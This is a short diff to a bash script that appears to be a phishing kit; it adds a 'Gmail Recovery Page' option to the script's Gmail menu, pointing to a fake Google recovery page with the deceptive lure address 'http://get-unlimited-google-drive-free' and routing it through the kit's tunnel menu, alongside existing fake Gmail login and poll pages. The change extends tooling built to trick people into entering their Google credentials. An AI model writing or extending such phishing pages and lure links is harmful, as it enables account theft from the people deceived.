@@ -464,6 +464,8 @@ site_gmail() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${RED}[${WHITE}04${RED}]${ORANGE} Gmail Recovery Page
+
 
 	EOF
 
@@ -480,6 +482,10 @@ site_gmail() {
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		website="google_poll"
 		mask='http://vote-for-the-best-social-media'
+		tunnel_menu
+	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
+		website="google_recovery"
+		mask='http://get-unlimited-google-drive-free'
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
